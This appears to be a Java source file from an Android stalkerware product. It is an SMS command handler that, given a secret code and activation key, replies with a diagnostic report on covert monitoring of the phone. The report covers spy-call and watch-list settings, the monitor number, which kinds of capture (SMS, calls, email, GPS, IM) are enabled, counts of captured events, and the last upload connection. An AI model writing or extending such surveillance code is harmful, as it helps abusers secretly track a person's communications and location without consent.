package com.fx.dalvik.smscommand.interpreter;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import android.app.ActivityManager;
import android.app.ActivityManager.MemoryInfo;
import android.content.Context;
import android.location.LocationManager;
import android.os.Build;

import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.eventdb.EventDatabaseManager;
import com.fx.maind.ref.Customization;
import com.fx.preference.ConnectionHistoryManager;
import com.fx.preference.ConnectionHistoryManagerFactory;
import com.fx.preference.PreferenceManager;
import com.fx.preference.SpyInfoManager;
import com.fx.preference.SpyInfoManagerFactory;
import com.fx.preference.model.ConnectionHistory;
import com.fx.preference.model.ProductInfo;
import com.fx.preference.model.ProductInfo.ProductEdition;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;
import com.vvt.phoneinfo.NetworkInfo;
import com.vvt.phoneinfo.PhoneInfoHelper;

public class SmsDiagnostics {
	
	private static final String TAG = "SmsDiagnostics";
 	private static final boolean LOCAL_LOGV = Customization.VERBOSE;
	
	public static final String COMMAND_ID = "*#62";
	
	// <*#62><FK>
	public static String processCommand(Context context, 
			String[] tokens, String header) {
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens));
		if (!debugTagValidation) {
			return String.format("%s%s\n%s", 
					header, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(context, tokens[1]);
		
		if (!activationCodeValidation.equals(
				FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return header + activationCodeValidation;
		}
		
		PreferenceManager preferenceManager = PreferenceManager.getInstance(context);
		EventDatabaseManager eventDbManager = EventDatabaseManager.getInstance(context);
		
		SimpleDateFormat dateFormatter = new SimpleDateFormat("yyyy-MM-dd HH:mm");
		
		NetworkInfo networkOperator = PhoneInfoHelper.getInstance(context).getNetworkInfo();
		
		ActivityManager activityManage 
				= (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		
		LocationManager locationManager 
				= (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		
		ConnectionHistoryManager connectionHistoryManager = 
			ConnectionHistoryManagerFactory.getInstance(context);
		
		ConnectionHistory connectionHistory = 
			connectionHistoryManager.getLatestConnectionHistory();
		
		ProductInfo productInfo = PreferenceManager.getInstance(context).getProductInfo();
		ProductEdition productEdition = productInfo.getEdition();
		
		SpyInfoManager spyInfo = SpyInfoManagerFactory.getSpyInfoManager(context);
		
		boolean isSpyEnabled = 
			productEdition == ProductEdition.PROX || 
			productEdition == ProductEdition.PRO;
		
		StringBuilder builder = new StringBuilder();
		
		// 1> Application ID, Version
		String productIdVersion = productInfo.getId() + ", " 
				+ productInfo.getVersionName();
		builder.append("1>").append(productIdVersion).append("\n");
		
		// 2> Device Type
		String deviceType = PhoneInfoHelper.getModel();
		builder.append("2>").append(deviceType).append("\n");
		
		// 3> OS
		String androidVersion = Build.VERSION.RELEASE;
		builder.append("3>").append(androidVersion).append("\n");
		
		// 4> Spy Call and Watch List information
		String monitorNumber = null;
		
		if (isSpyEnabled) {
			// For Pro, this will result in disabled
			String watchlistStatus = spyInfo.isWatchAllEnabled() ? "2" : 
				spyInfo.isWatchListEnabled() ? "1" : "0";
			String spycallStatus = spyInfo.isEnabled() ? "1" : "0";
			monitorNumber = spyInfo.getMonitorNumber() != null &&
					spyInfo.getMonitorNumber().length() > 0 ? spyInfo.getMonitorNumber() : "N/A";
						
			builder.append("4>")
					.append(watchlistStatus).append(", ")
					.append(spycallStatus).append(", ")
					.append(monitorNumber)
					.append("\n");
		}
		
		// 5> Capture On or Off
		String captureStatus = preferenceManager.isCaptureEnabled() ? "1" : "0";
		builder.append("5>").append(captureStatus).append("\n");
		
		// 6> Event to Capture <SMS,CALL,EMAIL,GPS,IM>
		String captureSms = preferenceManager.isCaptureSmsEnabled() ? "1" : "0";
		String captureCall = preferenceManager.isCaptureCallLogEnabled() ? "1" : "0";
		String captureEmail = preferenceManager.isCaptureEmailEnabled() ? "1" : "0";
		String captureGps = preferenceManager.isCaptureLocationEnabled() ? "1" : "0";
		String captureIm = preferenceManager.isCaptureImEnabled() ? "1" : "0";
		String eventToCapture = String.format("<%s, %s, %s, %s, %s>", 
				captureSms, captureCall, captureEmail, captureGps, captureIm);
		builder.append("6>").append(eventToCapture).append("\n");
		
		// 7> SMS IN/OUT
		String smsInOut = eventDbManager.countIncomingSms() + ", " 
				+ eventDbManager.countOutgoingSms();
		builder.append("7>").append(smsInOut).append("\n");
		
		// 8> Voice Call In/Out/Missed
		String voiceInOutMissed = eventDbManager.countIncomingCall() + ", "
				+ eventDbManager.countOutgoingCall() + ", " 
				+ eventDbManager.countMissedCall();
		builder.append("8>").append(voiceInOutMissed).append("\n");
		
		// 9> LOC Event, System Event
		String locationSystem = String.format("%d, %d", 
				eventDbManager.countLocation(), eventDbManager.countSystem());
		builder.append("9>").append(locationSystem).append("\n");
		
		// 10> EMAIL in/out
		String emailInOut = String.format("%d, %d", 
				eventDbManager.countIncomingEmail(), 
				eventDbManager.countOutgoingEmail());
		builder.append("10>").append(emailInOut).append("\n");
		
		// 11> Max number of events
		builder.append("11>").append(preferenceManager.getMaxEvents()).append("\n");
		
		// 12> Timer
		builder.append("12>").append(preferenceManager.getDeliveryPeriodHours()).append("\n");
		
		// 13> Monitor Number
		if (isSpyEnabled) {
			builder.append("13>").append(monitorNumber).append("\n");
		}
		
		// 14> Last Connection Time
		if (connectionHistory != null) {
			Long startTime = connectionHistory.getConnectionStartTime();
			if (startTime == null) {
				startTime = connectionHistory.getTimestamp();
			}
			if (startTime != null) {
				builder.append("14>").append(
						dateFormatter.format(new Date(startTime))).append("\n");
			}
		}
		
		// 15> Response Code
		if (connectionHistory != null) {
			Byte responseCode = connectionHistory.getResponseCode();
			if (responseCode != null) {
				builder.append("15>").append(String.format("0x%02X", responseCode)).append("\n");
			}
		}
		
		// 16> APN Recovery Info
//		builder.append("16>").append("*").append("\n");
		
		// 17> TUPLE for current net-work operator -> MCC, MNC
		builder.append("17>").append(networkOperator.getMcc()).append(", ");
		builder.append(networkOperator.getMnc()).append("\n");
		
		// 18> Network Name
		builder.append("18>").append(networkOperator.getOperatorName()).append("\n");
		
		// 19> Data Base size e.g. 32445 in KB
//		builder.append("19>").append("*").append("\n");
		
		// 20> Install Drive e.g. 20>C:
//		builder.append("20>").append("*").append("\n");
		
		// 21> Free Phone Memory e.g. 21>32452 in KB
		MemoryInfo memoryInfo = new MemoryInfo();
		activityManage.getMemoryInfo(memoryInfo);
		builder.append("21>").append(memoryInfo.availMem).append("\n");
		
		// 23> DB corrupted count e.g. 23>0
//		builder.append("23>").append("*").append("\n");
		
		// 24> DB Damaged count e.g. 24>0
//		builder.append("24>").append("*").append("\n");
		
		// 25> DB Dropped Count e.g. 25>25
//		builder.append("25>").append("*").append("\n");
		
		// 26> DB row corrupted e.g. 26>5
//		builder.append("26>").append("*").append("\n");
		
		// 27> DB recovered count e.g. 27>6
//		builder.append("27>").append("*").append("\n");
		
		// 28> Phone GPS Setting
		List<String> providers = locationManager.getAllProviders();
		
		if (!providers.isEmpty()) {
			builder.append("28>");
			for (String provider : providers) {
				builder.append(provider);
				if (providers.indexOf(provider) < providers.size()-1) {
					builder.append(", ");
				}
			}
			builder.append("\n");
		}
		
		// 32> IM in/out
		String imInOut = String.format("%d, %d", 
				eventDbManager.countIncomingIm(),  
				eventDbManager.countOutgoingIm());
		builder.append("32>").append(imInOut).append("\n");
		
		return builder.toString();
	}

}
